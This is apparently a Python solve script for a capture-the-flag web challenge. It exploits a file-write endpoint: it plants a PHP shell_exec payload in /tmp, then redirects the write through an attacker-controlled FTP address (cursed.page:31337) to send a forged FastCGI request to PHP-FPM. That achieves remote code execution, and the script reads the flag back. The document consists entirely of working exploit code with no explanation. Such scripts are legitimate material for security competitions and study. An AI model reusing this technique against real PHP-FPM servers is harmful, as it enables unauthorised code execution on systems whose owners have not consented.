import os
import re
import requests
import struct


VICTIM_ADDR = 'http://localhost:8009/'
FAKE_FTP_ADDR = 'ftp://cursed.page:31337/pwned'
EVIL_SCRIPT_ID = os.urandom(16).hex()
FLAG_TXT_ID = os.urandom(16).hex()


def create_packet(packet_type, content):
    version, request_id, padding_length, reserved = 1, 1, 0, 0
    header = struct.pack('>BBHHBB', version, packet_type, request_id, len(content), padding_length, reserved)
    return header + content


def pack_params(params):
    result = b''
    for k, v in params.items():
        assert len(k) <= 127 and len(v) <= 127
        result += struct.pack('>BB', len(k), len(v)) + k.encode() + v.encode()
    return result


params = {
    'SCRIPT_FILENAME': f'/tmp/{EVIL_SCRIPT_ID}.php',
    'QUERY_STRING': '',
    'SCRIPT_NAME': f'/{EVIL_SCRIPT_ID}.php',
    'REQUEST_METHOD': 'GET',
}

FCGI_BEGIN_REQUEST = 1
FCGI_PARAMS = 4
FCGI_STDIN = 5
FCGI_RESPONDER = 1

evil_fcgi_packet = b''.join([
    create_packet(FCGI_BEGIN_REQUEST, struct.pack('>H', FCGI_RESPONDER) + b'\x00' * 6),
    create_packet(FCGI_PARAMS, pack_params(params)),
    create_packet(FCGI_PARAMS, pack_params({})),
    create_packet(FCGI_STDIN, b''),
])

evil_php = f'''
<?php shell_exec("/readflag > /tmp/{FLAG_TXT_ID}.txt && chmod 444 /tmp/{FLAG_TXT_ID}.txt"); ?>
'''

requests.get(VICTIM_ADDR, params={
    'file': f'/tmp/{EVIL_SCRIPT_ID}.php',
    'data': evil_php,
})

requests.get(VICTIM_ADDR, params={
    'file': FAKE_FTP_ADDR,
    'data': evil_fcgi_packet,
})

flag = requests.get(VICTIM_ADDR, params={
    'file': f'/tmp/{FLAG_TXT_ID}.txt',
    'data': '',
}).text

print(re.search('(hxp{.*})', flag).group(1))